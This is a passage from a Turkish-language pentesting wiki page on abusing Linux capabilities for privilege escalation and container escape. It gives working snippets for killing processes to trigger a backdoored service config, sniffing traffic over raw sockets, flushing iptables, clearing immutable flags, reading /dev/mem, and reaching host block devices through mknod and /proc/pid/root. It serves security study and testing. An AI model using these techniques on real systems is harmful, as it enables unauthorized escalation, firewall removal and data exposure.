CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

Bu capability, dosya capability’lerinin yazılmasına olanak tanır; ancak tek başına bu capability’leri mevcut sürece vermez veya dosya çalıştırıldığında uygulanan dosya, bounding set ve namespace kurallarını aşmaz.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

Dosyanın izin verilen capabilities kümesi, process'in capability bounding set'iyle sınırlıdır. Dosyanın effective biti, dosyanın izin verilen kümesinin process'in effective kümesine yükseltilip yükseltilmeyeceğini belirler. Bu nedenle, bir dosyaya capability eklemek istenen her capability'nin execution time'da otomatik olarak kullanılabilir olmasını sağlamaz.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `/dev/mem`, `/dev/kmem` veya `/proc/kcore` erişimi, `mmap_min_addr` değerini değiştirme, `ioperm(2)` ve `iopl(2)` system call'larına erişim ve çeşitli disk komutları dahil olmak üzere bir dizi hassas işlemi sağlar. `FIBMAP ioctl(2)` da bu capability aracılığıyla etkinleştirilir ve bu durum [geçmişte](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) sorunlara yol açmıştır. Man page'e göre bu capability, sahibinin diğer cihazlarda cihaza özgü çeşitli işlemleri gerçekleştirmesine de olanak tanır.<sup>[[14]](#references)</sup>

Bu, **privilege escalation** ve **Docker breakout** için yararlı olabilir.<sup>[[14]](#references)</sup>

Capability tek başına kullanışlı bir arayüz sunmaz. Bir container breakout için ayrıca erişilebilir bir host device veya resource, device-cgroup ve filesystem izinleri ile donanıma ve kernel'e özgü bir teknik gerekir. Strict `/dev/mem` kısıtlamaları, kernel lockdown, virtualization, seccomp ve LSM policy genellikle genel yolları devre dışı bırakır. Önce capability'yi ve maruz kalınan kaynakları doğrulayın:

```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

`/dev/mem` onaylı arayüzse, kullan-at bir laboratuvar, laboratuvarın donanım haritasından seçilen bir aralığı okuyup hash'leyerek sınırlar arası düğüm belleği ifşasını gösterebilir:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Aralığı tahmin etmeyin: Bazı MMIO bölgelerini okumak yan etkilere neden olabilir ve bir platformda geçerli olan bir adres, başka bir platformda donanımı veya kernel belleğini kontrol edebilir. Kernel belleğini değiştirmek veya cihazı kontrol etmek için onaylanmış, platforma özgü bir kanıt gerekir; raw write için güvenli ve evrensel bir örnek yoktur.

## CAP_KILL

**Bu capability, kernel tarafından tanımlanan durumlarda süreçlere sinyal gönderirken yapılan izin denetimlerini atlatır**.<sup>[[14]](#references)</sup>

**Binary ile örnek**

**`python`** binary'sinin bu capability'ye sahip olduğunu varsayalım. **Bir servisin veya socket'in yapılandırma dosyasını** (ya da servisle ilgili herhangi bir yapılandırma dosyasını) değiştirebilirseniz, dosyaya backdoor ekleyebilir, ardından bu servisle ilişkili süreci sonlandırabilir ve backdoor içeren yeni yapılandırma dosyasının yürütülmesini bekleyebilirsiniz.

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc with kill**

Kill yetenekleriniz varsa ve root olarak (veya başka bir kullanıcı olarak) çalışan bir **node programı** bulunuyorsa, muhtemelen programa **SIGUSR1 sinyalini** **göndererek** node debugger'ı açmasını sağlayabilir ve debugger'a bağlanabilirsiniz.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```


{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Bu capability, 1024'ün altındaki Internet portlarına bağlanmayı sağlar.** Doğrudan daha geniş ayrıcalık yükseltme yetkisi vermez.<sup>[[14]](#references)</sup>

**Binary ile örnek**

**`python`** bu capability'ye sahipse herhangi bir portu dinleyebilir ve hatta bu porttan başka herhangi bir porta bağlanabilir (bazı hizmetler belirli ayrıcalıklı portlardan gelen bağlantıları gerektirir).

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html), süreçlerin **RAW ve PACKET soketleri oluşturmasına** izin verir; böylece istedikleri ağ paketlerini oluşturup gönderebilirler. Bu durum, paket spoofing, trafik enjeksiyonu ve ağ erişim denetimlerini atlatma gibi container ortamlarında güvenlik risklerine yol açabilir. Kötü niyetli kişiler, özellikle yeterli firewall koruması olmadığında, container yönlendirmesine müdahale etmek veya host ağ güvenliğini tehlikeye atmak için bu özelliği kötüye kullanabilir. Ayrıca **CAP_NET_RAW**, RAW ICMP istekleri aracılığıyla ping gibi işlemleri destekler.<sup>[[14]](#references)</sup>

**Bu özellik, uygun bir soket arayüzüyle paket yakalamayı mümkün kılabilir.** Ancak doğrudan daha geniş kapsamlı bir privilege escalation sağlamaz.<sup>[[14]](#references)</sup>

Kimlik bilgilerinin açığa çıkabileceği bir yol için, mevcut hesabın etkin capabilities ile bir yakalama aracını çalıştırabildiğini, ilgili trafiğin network namespace içindeki görünür bir arayüzden geçtiğini ve kimlik doğrulama bilgilerinin plaintext olarak gönderildiğini de doğrulayın. Örneğin, şifrelenmemiş HTTP üzerinden gönderilen HTTP Basic kimlik bilgileri, yakalama aracı bu arayüze erişebiliyorsa loopback üzerinde gözlemlenebilir. Başka bir hesaba geçiş için, yakalanan kimlik bilgilerinin başka bir kimlikte de çalışması gerekir; bir file capability veya görünür bir login isteği, parola tekrar kullanımını tek başına kanıtlamaz.

Kablosuz bir hostta, etkin `CAP_NET_RAW` yetkisine sahip `reaver` gibi bir WPS denetim aracı ve `iw dev` üzerinden görülebilen bir AP ile monitor-mode arayüzü de incelemeye değer bir ipucudur. Bu, kullanılabilir bir escalation olduğunu **kanıtlamaz**: AP, etkili bir kilitleme olmadan WPS PIN kimlik doğrulamasını desteklemeli, kablosuz arayüz üzerinden erişilebilir olmalı ve PSK'yi açığa çıkarmalıdır; host ayrıcalıkları ise yalnızca bu PSK bir hesapta tekrar kullanılıyorsa değişir. Pasif enumeration, probe göndermek veya PIN denemek yerine arayüz modlarını ve capabilities değerlerini raporlamalıdır. WPS PIN zafiyeti için [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755), aracın davranışı için [Reaver'ın proje belgelerine](https://github.com/shift/reaver-wps) bakın.

**Binary örneği**

**`tcpdump`** binary'si bu capability'ye sahipse, onu ağ bilgilerini yakalamak için kullanabilirsiniz.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

**environment** bu capability'yi veriyorsa, **`tcpdump`** trafiği sniff etmek için de kullanabilir.<sup>[[14]](#references)</sup>

**2. binary ile örnek**

Aşağıdaki örnek, "**lo**" (**localhost**) interface'inin trafiğini yakalamak için kullanışlı olabilecek **`python2`** kodudur. Kod, [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) adresindeki "_The Basics: CAP-NET_BIND + NET_RAW_" lab'inden alınmıştır.<sup>[[1]](#references)</sup>

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html), sahibine mevcut network namespace içindeki firewall ayarları, yönlendirme tabloları, soket izinleri ve ağ arayüzü ayarları dahil **ağ yapılandırmalarını değiştirme** yetkisi verir. Ayrıca bu namespace içindeki bir arayüzde promiscuous mode'u etkinleştirebilir; bu, söz konusu arayüze iletilen trafiği açığa çıkarabilir, ancak tek başına diğer network namespace'lerdeki rastgele arayüzleri dinlemeye izin vermez.<sup>[[14]](#references)</sup>

Bu işlemler sürecin **mevcut network namespace'ini** etkiler. Host ağ durumunu kontrol etmek için `--network=host`, Kubernetes'te `hostNetwork: true` veya ayrı bir namespace'e giriş yöntemi gerekir. `CAP_NET_RAW` tek başına genel amaçlı bir host shell sağlamaz; ancak belgelenmiş, protokole özgü bir kaçış yönteminde kullanılmıştır: Geçmişteki bir GCE zinciri; root erişimini, host network namespace'ini, `CAP_NET_ADMIN`, `CAP_NET_RAW`, şifrelenmemiş metadata trafiğini ve SSH anahtarı eklemek için yarış koşuluna açık bir guest-agent isteğini bir araya getiriyordu. Gerekli tüm koşullar ve güncel HTTPS metadata ile ilgili uyarılar için [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) sayfasına bakın.

**İkili dosyayla örnek**

**python binary**'sinin bu capabilities'e sahip olduğunu varsayalım.

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP_LINUX_IMMUTABLE

**Bu capability, immutable ve append-only gibi inode flag'lerinin değiştirilmesine izin verir.** Daha geniş kapsamlı yetki yükseltme olanağını doğrudan sağlamaz.<sup>[[14]](#references)</sup>

**Binary ile örnek**

Bir dosyanın immutable olduğunu ve Python'ın bu capability'ye sahip olduğunu fark ederseniz, **immutable niteliğini kaldırıp dosyayı değiştirilebilir hâle getirebilirsiniz:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
    f.write('New content for the file\n')
```

`FS_IOC_GETFLAGS` ve `FS_IOC_SETFLAGS` işlemleri inode flag'lerini okur ve günceller; `FS_IMMUTABLE_FL`, bu örnekte temizlenen immutable flag'idir.<sup>[[27]](#references)</sup>

> [!TIP]
> Bu immutable niteliğinin genellikle şu şekilde ayarlanıp kaldırıldığını unutmayın:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `chroot(2)` sistem çağrısının yürütülmesini sağlar; bu da bilinen tekniklerle zayıf biçimde oluşturulmuş bir `chroot(2)` jail'inden kaçışa olanak tanıyabilir.<sup>[[11]](#references)[[14]](#references)</sup>

Bu, **chroot-jail kaçışına yönelik bir yetenektir; tek başına container'dan host'a kaçış sağlamaz**. Host dosya sistemini açığa çıkarmaz veya dosya izinlerini aşmaz. Host root dizini zaten mount edilmişse ya da `/proc/<pid>/root` üzerinden erişilebiliyorsa, `chroot()` yalnızca bu mevcut ağacı sürecin yol adı kökü yapar. Ayrıca, `setns(2)` ile mount namespace'lerini değiştirmek için çağıranın user namespace'inde hem `CAP_SYS_CHROOT` hem de `CAP_SYS_ADMIN` ve hedef mount namespace'inin sahibi olan user namespace'te `CAP_SYS_ADMIN` gerekir.<sup>[[14]](#references)</sup>

- [Çeşitli chroot çözümlerinden nasıl kaçılır](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot kaçış aracı](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html), sistemin yeniden başlatılması için `reboot(2)` sistem çağrısının ( `LINUX_REBOOT_CMD_RESTART2` gibi komutlar dahil) yürütülmesine izin verir; ayrıca yeni veya imzalı crash kernel'lerini yüklemek için sırasıyla `kexec_load(2)` ve Linux 3.17 sürümünden itibaren `kexec_file_load(2)` çağrılarını etkinleştirir.<sup>[[14]](#references)</sup>

Private bir PID namespace içinde desteklenen bir `reboot()` isteği, host'u yeniden başlatmak yerine o namespace'in init sürecini sonlandırır. Bu nedenle host'un yeniden başlatılmasına yol açmak için başlangıç PID namespace'inde bulunmak gerekir; bu da normalde host PID paylaşımıyla sağlanır. Kexec tabanlı bir takeover için ayrıca uyumlu bir imaj, kullanılabilir bir syscall ve izin veren lockdown ile imza politikaları gerekir. Yeteneği doğrulamak amacıyla paylaşılan bir host'ta bu işlemlerden hiçbirini tetiklemeyin:

```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html), Linux 2.6.37'de daha kapsamlı olan **CAP_SYS_ADMIN**'den ayrılarak özellikle `syslog(2)` çağrısını kullanma yetkisi vermek üzere oluşturuldu. Bu capability, kernel adreslerinin açığa çıkmasını denetleyen `kptr_restrict` ayarı 1 olduğunda `/proc` ve benzer arayüzler üzerinden kernel adreslerinin görüntülenmesini sağlar. Linux 2.6.39'dan beri `kptr_restrict` ayarının varsayılan değeri 0'dır; bu, kernel adreslerinin açığa çıktığı anlamına gelir. Ancak birçok dağıtım, güvenlik nedeniyle bu ayarı 1 (adresleri uid 0 dışındaki kullanıcılardan gizle) veya 2 (adresleri her zaman gizle) olarak belirler.<sup>[[14]](#references)</sup>

Ayrıca **CAP_SYSLOG**, `dmesg_restrict` ayarı 1 olduğunda `dmesg` çıktısına erişilmesini sağlar. Bu değişikliklere rağmen **CAP_SYS_ADMIN**, tarihsel nedenlerle `syslog` işlemlerini gerçekleştirme yetkisini korur.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `mknod` sistem çağrısının işlevselliğini normal dosyalar, FIFO'lar (adlandırılmış pipe'lar) veya UNIX domain socket'ler oluşturmaktan öteye taşır. Özellikle şu özel dosyaların oluşturulmasına izin verir:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Terminal gibi aygıtlar olan karakter özel dosyaları.
- **S_IFBLK**: Disk gibi aygıtlar olan blok özel dosyaları.

Bu capability, karakter veya blok aygıtları da dahil olmak üzere aygıt dosyaları oluşturması gereken süreçler için kullanışlıdır.<sup>[[14]](#references)</sup>

Docker'ın belgelenmiş varsayılan capability kümesine dahildir; her dağıtımın aynı varsayılanları kullandığını varsaymak yerine gerçek runtime yapılandırmasını doğrulayın ([Moby varsayılan capability listesi](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Bir container escape için `CAP_MKNOD`, gerçek bir host aygıtına eksik bir handle oluşturabilir; ancak temel aygıtı **oluşturmaz** ve device cgroup'u **atlatmaz**. İşlemin tamamlanması için gerekenler:

1. Aygıt oluşturma namespaced olmadığı için ilk user namespace'te etkin `CAP_MKNOD`.
2. Gerçek bir host aygıtına ait doğru blok veya karakter türü ile major/minor numaraları.
3. Bu aygıtı açmak için device-cgroup izni.
4. Uyumlu, filesystem farkında bir okuyucu veya blok filesystem'i mount etmek için `CAP_SYS_ADMIN`.
5. Node'u oluşturmak ve kullanmak için filesystem ve LSM izinleri.

Gerçek major/minor numaraları `252:1` olan bir ext-family lab blok aygıtında, salt okunur doğrulama şöyledir:

```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Sayıları `/sys/class/block/<device>/dev` tarafından bildirilenlerle değiştirin. Node oluşturma başarılı olur ancak açma işlemi `Operation not permitted` hatası verirse device cgroup erişimi hâlâ engelliyordur. Bu, yalnızca Docker'ın varsayılan `CAP_MKNOD` yetkisine sahip olup açık bir device izni olmayan container'da normal sonuçtur.

Doğrudan container device erişimiyle karıştırılmaması gereken, ayrıca iki foothold gerektiren bir **yerel privilege-escalation** tekniği vardır. Başlangıç user namespace'ini paylaşan bir container'daki root process, block-device node'u oluşturabilir; host'taki eşleşen UID'ye sahip ayrıcalıksız bir shell ise bu node'u `/proc/<container-pid>/root` üzerinden açar. Açma işlemi host shell'in cgroup'unda değerlendirilir; dolayısıyla container'ın device-cgroup engeli artık device'ı korumaz.<sup>[[7]](#references)</sup>

Container içinde node'u oluşturun ve mevcut host foothold'un UID'siyle çalışan bir process'i açık tutun:

```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
  useradd -u "$host_uid" -M htbridge
  bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```

Mevcut host shell'den, bu UID'ye sahip uyuyan container process'in host PID'sini belirleyin ve aygıtın yolu olarak onun procfs root'unu kullanın:

```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```

Bu chain için her iki foothold, identity-mapped veya paylaşılan bir user namespace, hedef `/proc/<pid>/root` dizininde gezinme izni, doğru major/minor numaralarına sahip gerçek bir device ve open işlemine izin veren bir dış cgroup gerekir. `hidepid`, ptrace erişim kuralları, bir LSM, filesystem uyumsuzluğu veya user-namespace remapping bu chain'i bozabilir. Bu tarihsel teknik, `/proc/<pid>/root` yolunun *container'ın* device-cgroup kısıtlamasını nasıl aşabildiğini açıkladığı için değerlidir; normal şekilde izole edilmiş bir container'dan yalnızca `CAP_MKNOD` ile kaçılabileceğini iddia etmez.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

File capabilities kullanan güncel Linux kernel'lerinde **`CAP_SETPCAP`**, bir thread'in bounding set'indeki capabilities'leri inheritable set'ine eklemesine, bounding set'indeki capabilities'leri düşürmesine ve securebits'ini değiştirmesine olanak tanır. Bir process'in başka bir process'e keyfi olarak capabilities vermesine izin vermez; bu davranış yalnızca file-capability desteği olmayan 2.6.25 öncesi kernel'ler için geçerlidir.<sup>[[14]](#references)</sup>

`capset()` system call'u bir thread'in kendi effective, permitted ve inheritable set'lerini ayarlayabilir; ancak yeni permitted set, mevcut permitted set'in dışında capabilities içeremez ve inheritable güncellemeleri kernel kısıtlamalarına tabi olmaya devam eder.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Linux capabilities ayrıcalık yükseltme lab'ları](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Linux'ta ayrıcalık yükseltme](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux Container'larının Temelleri: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Linux Capabilities'ten Yararlanma](https://www.linuxjournal.com/article/5737)
- [6] [Aşırı Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [/proc/pid/root üzerinden mount namespace'lerine erişimi kötüye kullanma](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Neden Varlar ve Nasıl Çalışırlar](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Linux'ta Capabilities'i Anlamak](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [ptrace'e izin verildiğinde seccomp'u aşmaya yönelik PoC](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Çeşitli chroot çözümlerinden nasıl çıkılır](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - Sebastian Krahmer'in orijinal CAP_DAC_READ_SEARCH Docker breakout exploit'i](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Docker breakout exploit analizi](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu kılavuz sayfası](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Container'ları çalıştırma - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
